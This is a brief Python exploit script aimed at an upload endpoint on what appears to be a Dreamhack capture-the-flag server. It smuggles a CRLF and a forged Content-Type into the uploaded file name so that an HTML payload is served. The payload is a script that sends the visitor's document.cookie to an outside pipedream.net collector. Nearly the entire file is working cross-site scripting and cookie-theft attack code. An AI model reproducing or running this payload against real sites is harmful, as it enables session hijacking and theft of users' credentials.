from requests import *

URL = "http://host1.dreamhack.games:16841"

res = post(f'{URL}/upload', data={'name':'image/png,text/html;'},files={'file':('test\r\nContent-Type.png',"<script>location.href='https://eodxumeonkl064t.m.pipedream.net/?'.concat(document.cookie)</script>",'image/png')})

